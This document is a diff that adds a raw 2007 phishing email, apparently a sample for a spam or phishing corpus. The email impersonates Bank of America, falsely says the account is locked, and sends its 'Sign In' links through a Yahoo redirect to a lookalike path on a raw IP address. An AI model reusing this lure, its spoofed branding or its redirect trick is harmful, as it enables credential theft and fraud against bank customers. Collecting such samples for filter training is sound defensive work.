@@ -1,0 +1,333 @@
+Return-Path: <servicecenter@bankofamerica.us>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 6FCD4468DB
+	for <user@login.example.com>; Wed, 16 May 2007 16:10:19 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id A37C6131FA5A
+	for <user@example.com>; Wed, 16 May 2007 16:10:19 -0400 (EDT)
+Received: from mail2.hgcaonline.com (mail2.hgcaonline.com [68.75.40.151])
+	by mail.example.org (Postfix) with ESMTP id 874356FA1C5
+	for <user@example.com>; Wed, 16 May 2007 16:10:19 -0400 (EDT)
+Received: from User ([75.17.72.225]) by mail2.hgcaonline.com with Microsoft SMTPSVC(6.0.3790.1830);
+	 Wed, 16 May 2007 12:09:57 -0500
+From: "Bank of America"<servicecenter@bankofamerica.us>
+Subject: Bank of America alert: Sign-in to Online Banking locked
+Date: Wed, 16 May 2007 16:10:11 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <FS49cAgjHXwKHvyo3Dj000006b0@mail2.hgcaonline.com>
+X-OriginalArrivalTime: 16 May 2007 17:09:57.0968 (UTC) FILETIME=[07E9D500:01C797DD]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1265
+
+<br><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+	<head>
+		<title>Bank of America Alert</title>
+
+		<!-- embedded style sheet -->
+		<style type="text/css">
+		<!--
+			a:link {
+				color: #405ebe;
+				background: #ffffff;
+			}
+			a:hover {
+				color: #0000ff;
+				background: #ffffff;
+			}
+			body, table, div, h1, h2, h3, h4, h5, h6, p {
+				font-family: verdana;
+				color: #333333;
+				background: #ffffff;
+			}
+			.font-sign-in {
+				font-size: 70%;
+				font-family: "verdana";
+				font-weight: bold;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			h1 {
+				font-size: 100%;
+				font-family: verdana;
+				color: #d4001a;
+				background: #ffffff;
+				margin-bottom: 0px;
+			}
+			.font-title-red {
+				font-size: 105%;
+				font-family: verdana;
+				color: #d4001a;
+				background: #ffffff;
+				margin-bottom: 0px;
+			}
+			.font-x {
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+			}
+			.font-y {
+				font-size: 70%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			.font-footer {
+				color: #333333;
+				background: #ffffff;
+				font-size: 70%;
+				margin-top: 0em;
+				margin-bottom: 1em;
+			}
+			.inner-table {
+
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				margin-bottom: 1em;
+				line-height: 1.4;
+				margin-top: .8em;
+			}
+			.paragraph-body {
+				font-size: 70%;
+				margin-top: 0.45em;
+				margin-bottom: 1em;
+				color: #333333;
+				background: #ffffff;
+				line-height: 1.4;
+			}
+			.paragraph-dynamic {
+				color: #333333;
+				background: #e9e8e3;
+				font-size: 70%;
+				font-family: verdana;
+				line-height: 1.4;
+			}
+			.paragraph-fine-print {
+				font-size: 65%;
+				font-family: verdana;
+				margin-bottom: 1em;
+				color: #333333;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			.email-address {
+				text-transform: lowercase;
+				background: #f0f0f0;
+			}
+			hr {
+				width: 100%;
+				color: #999999;
+			}
+			.red-heading {
+				width: 78.6%;
+			}
+			.bold { font-weight: bold; }
+			.first-col { width: 15px;  background: #f0f0f0;}
+			.second-col { width: 145px;  background: #f0f0f0;}
+			.third-col { width: 15px; }
+			.fourth-col { width: 572px; }
+			.first-second-col { width: 160px;  background: #f0f0f0;}
+			.third-fourth-col { width: 587px; }
+			.first-second-third-col { width: 175px; }
+			.all-four-col { width: 747px; }
+			.banner-row { height: 70px; }
+			.sub-banner-row { height: 93px; }
+			.empty-row { height: 25px; }
+		-->
+		</style>
+
+	<!-- body -->
+	</head>
+	<body>
+		<table width="747" border="0" cellpadding="0" cellspacing="0" summary="Email Body Layout">
+			<!-- table header -->
+			<tr class="banner-row">
+				<td class="all-four-col" colspan="4">
+					<img width=747 height=70 src="http://alert.bankofamerica.com/images/client/bankofamerica/email_masthead_top.jpg" alt="Bank of America Higher Standards"></td>
+			</tr>
+
+
+
+			<!-- row 1 -->
+			<tr class="sub-banner-row">
+				<!-- row 1 cell 1-2 -->
+				<td class="first-second-col" colspan="2">
+					<img width=160 height=103 src="http://alert.bankofamerica.com/images/client/bankofamerica/em_photo.jpg" alt="Customer using a laptop for Online Banking"></td>
+				<!-- row 1 cell 3-4 -->
+				<TD class="red-heading" colspan="2" style="background: #d4001a">
+					<img width=193 height=103 src="http://alert.bankofamerica.com/images/client/bankofamerica/em_title_red.gif" alt="Online Banking Alert"></td>
+			</tr>
+			<!-- row 2 -->
+			<tr class="empty-row" height="25px">
+				<!-- row 2 cell 1-2 -->
+				<td class="first-second-col" colspan="2">
+				</td>
+				<!-- row 2 cell 3-4 -->
+				<td class="third-fourth" colspan="2">
+				</td>
+			</tr>
+			<!-- row 3 -->
+			<tr>
+				<!-- row 3 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 3 cell 2 -->
+				<td class="second-col" valign="top">
+					<div class="font-sign-in">
+						to reset your passcode please<br>
+                        <a style="color: #d4001a; text-decoration: none; background: #f0f0f0" title="Sign in to Bank of America Online Banking." href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://65.212.119.2/aspnet_client/system_web/2_0_50727/http.www.bankofamerica.com.deposits.checksave.index..ht">Sign In »
+                        </a>
+					</div>
+				</td>
+				<!-- row 3 cell 3 -->
+				<td class="third-col">
+				</td>
+
+				<!-- Overrideable Section Start -->
+				<!-- row 3 cell 4 -->
+				<td class="fourth-col">
+					<h1>Online Banking Sign-in Error</h1>
+					<hr size="1px">
+				</td>
+			</tr>
+			<!-- row 4 -->
+			<tr>
+				<!-- row 4 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 4 cell 2 -->
+				<td class="second-col" valign="middle">
+					 </td>
+				<!-- row 4 cell 3 -->
+				<td class="third-col">
+				</td>
+				<!-- row 4 cell 4 -->
+				<td class="fourth-col">
+					<p class="paragraph-body" dir="ltr">For your security, 
+                    access to Online Banking has been locked because the number 
+                    of attempts to sign in exceeded the number allowed. To 
+                    regain access, you must restore your account.<br><br> Please 
+                    <a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://65.212.119.2/aspnet_client/system_web/2_0_50727/http.www.bankofamerica.com.deposits.checksave.index..ht"><b>
+                    click here</b></a> and submin your information. </p>
+					<p class="paragraph-body">
+						</p>
+				</td>
+			</tr>
+			<!-- Overrideable Section Finish -->
+			<!-- row 5 -->
+			<tr>
+				<!-- row 5 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 5 cell 2 -->
+				<td class="second-col" valign="bottom">
+					 </td>
+				<!-- row 5 cell 3 -->
+				<td class="third-col">
+				</td>
+				<!-- row 5 cell 4 -->
+				<td class="fourth-col">
+
+					<p class="paragraph-body">Want to confirm this email is from Bank of America? Sign in to Online Banking and select Alerts History to verify this alert.
+					</p>
+				</td>
+			</tr>
+
+			<!-- row 6 -->
+			<tr>
+				<!-- row 6 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 6 cell 2 -->
+				<td class="second-col">
+				</td>
+				
+
+
+				<!-- row 6 cell 4 -->
+				<td class="third-fourth-col" colspan=2>
+				<table style="background: #e9e8e3;" cellpadding="7px" boarder=0 width="99.6%" height="50px" align=right>
+					<tbody>
+					<tr>
+					<td>
+					<p class="paragraph-dynamic">
+Want to get more alerts? Sign in to Bank of America Online Banking and click the "Manage Alerts" link in the "I want to..." box.
+					</p>
+				</td>
+				</tr>
+				</tbody>
+				</table>
+				</td>
+			</tr>
+
+			<!-- add in a space between grey boxed messages -->
+			<TR height=2px>
+			<TD class=first-second-col colspan=2> </TD>
+			<TD class=third-fourth-col colspan=2> </TD>
+			</TR>
+
+			<!-- row 7 -->
+			<tr>
+				<!-- row 7 cell 1 -->
+				<td class="first-col">
+				</td>
+				<!-- row 7 cell 2 -->
+				<td class="second-col">
+				</td>
+				
+
+
+				<!-- row 7 cell 4 -->
+				<td class="third-fourth-col" colspan=2>
+				<table style="background: #f0f0f0;" cellpadding="10px" boarder=0 width="99.6%" align=right>
+					<tbody>
+					<tr>
+					<td>
+
+					<p class="paragraph-fine-print">
+						<strong >Because email is not a secure form of communication, please do not reply to this email.</strong><br>
+						 If you have any questions about your account or need assistance, please call the phone number on your statement or go to Contact Us at www.bankofamerica.com.
+					</p>
+				</td>
+				</tr>
+				</tbody>
+				</table>
+				</td>
+			</tr>
+
+			<!-- add dark bottom divider line -->
+  			<TR bgcolor="c0c0c0" height=1px>
+    			<TD class=all-four-col colSpan=4> </TD>
+  			</TR>
+
+			<!-- add space before table footer -->
+  			<TR bgcolor="ffffff" height=5px>
+    			<TD class=all-four-col colSpan=4> </TD>
+  			</TR>
+
+			<!-- table footer -->
+			<tr>
+				<td class="all-four-col" colspan="4">
+					<div class="font-footer">
+						<img width=131 height=33 src="http://alert.bankofamerica.com/images/client/bankofamerica/OlympicLogo_2_6_8_1_1_image.gif" alt="Official Sponsor 2004-2008 U.S. Olympic Teams" align="right">
+						Bank of America, Member FDIC. <br>
+						© 2007 Bank of America Corporation. All Rights Reserved.
+					</div>
+				</td>
+			</tr>
+		</table>
+	
+<img src='http://images.par3.com/AlertTrackingServlet?tid=713936366&dcc=SEA&retry=1&timeout=1167437858914' alt=''>
+</body>
+
